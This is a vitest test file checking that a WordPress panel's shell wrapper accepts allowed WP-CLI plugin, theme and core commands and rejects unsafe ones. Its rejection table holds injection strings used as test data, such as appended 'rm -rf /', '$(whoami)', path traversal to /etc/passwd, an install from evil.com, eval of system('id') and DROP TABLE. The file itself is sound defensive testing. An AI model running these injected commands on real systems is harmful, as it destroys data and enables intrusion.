import { spawnSync } from "node:child_process";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

// vitest runs under node (vitest.config.ts environment: "node") — use
// node:child_process, NOT Bun.*. Repo-root pattern matches mu-plugin-mirror.test.ts.
const here = dirname(fileURLToPath(import.meta.url));
const WRAPPER = resolve(here, "../../../../../bin/vibe-panel-run");

/**
 * Source the wrapper as a library (behind its VIBE_PANEL_RUN_LIB guard) and
 * invoke validate_wp_args with raw argv. Returns the exit code: 0 = accepted
 * (the function returned), 1 = rejected (die exits 1). 99 = sourcing failed.
 */
function runValidateWp(...args: string[]): number {
	const script =
		'VIBE_PANEL_RUN_LIB=1 . "$1" || exit 99; shift; validate_wp_args "$@"';
	const res = spawnSync("sh", ["-c", script, "sh", WRAPPER, ...args], {
		encoding: "utf8",
	});
	return res.status ?? -1;
}

describe("validate_wp_args — existing forms preserved", () => {
	it.each([
		[["core", "update"]],
		[["plugin", "update", "--all"]],
		[["plugin", "list", "--update=available", "--format=json"]],
		[["cron", "event", "run", "vibe_insights_collect_cron"]],
	])("accepts %j", (args) => {
		expect(runValidateWp(...(args as string[]))).toBe(0);
	});
});

describe("validate_wp_args — new per-item forms accepted", () => {
	it.each([
		[["plugin", "activate", "contact-form-7"]],
		[["plugin", "deactivate", "woocommerce"]],
		[["plugin", "update", "akismet"]],
		[["plugin", "delete", "hello-dolly"]],
		[["plugin", "update", "akismet", "--version=5.3.1"]],
		[["plugin", "auto-updates", "enable", "redis-cache"]],
		[["plugin", "auto-updates", "disable", "redis-cache"]],
		[["theme", "activate", "twentytwentyfour"]],
		[["theme", "update", "astra"]],
		[["theme", "delete", "storefront"]],
		[["theme", "auto-updates", "enable", "astra"]],
		[["core", "update", "--version=6.8.1"]],
	])("accepts %j", (args) => {
		expect(runValidateWp(...(args as string[]))).toBe(0);
	});
});

describe("validate_wp_args — injection + policy rejected", () => {
	it.each([
		// install is gone
		[["plugin", "install", "query-monitor"]],
		[["theme", "install", "hello-elementor"]],
		[["plugin", "install", "https://evil.com/backdoor.zip"]],
		// metacharacters / traversal in slug
		[["plugin", "activate", "contact-form-7; rm -rf /"]],
		[["plugin", "update", "woo$(whoami)merce"]],
		[["plugin", "delete", "woo|evil"]],
		[["plugin", "delete", "../../../etc/passwd"]],
		// path-traversal flags
		[["plugin", "update", "akismet", "--path=/tmp/evil"]],
		[["plugin", "activate", "akismet", "--url=https://evil.com"]],
		[["plugin", "update", "akismet", "--require=/tmp/evil.php"]],
		// blocked verbs
		[["eval", "system('id')"]],
		[["eval-file", "/tmp/evil.php"]],
		[["db", "query", "DROP TABLE wp_users"]],
		[["shell"]],
		[["config", "set", "DB_PASSWORD", "evil"]],
		[["search-replace", "old", "new"]],
		// namespace / verb / cron-hook injection
		[["INVALID", "activate", "slug"]],
		[["plugin", "INVALID", "slug"]],
		[["cron", "event", "run", "other_hook"]],
		// version-flag injection
		[["plugin", "update", "akismet", "--version=1.0; rm -rf /"]],
		[["core", "update", "--version=6.8.1 && evil"]],
		// multi-slug / arity
		[["plugin", "activate", "slug1", "slug2"]],
		[["plugin", "update", "slug1", "slug2", "slug3"]],
		// 64-char slug, empty slug, missing slug
		[["plugin", "activate", "a".repeat(64)]],
		[["plugin", "activate", ""]],
		[["plugin", "update"]],
	])("rejects %j", (args) => {
		// callback is (args), NOT ([args]) — each row's single element IS the arg
		// array. ([args]) would set args to the first string and spread its chars.
		expect(runValidateWp(...(args as string[]))).toBe(1);
	});
});
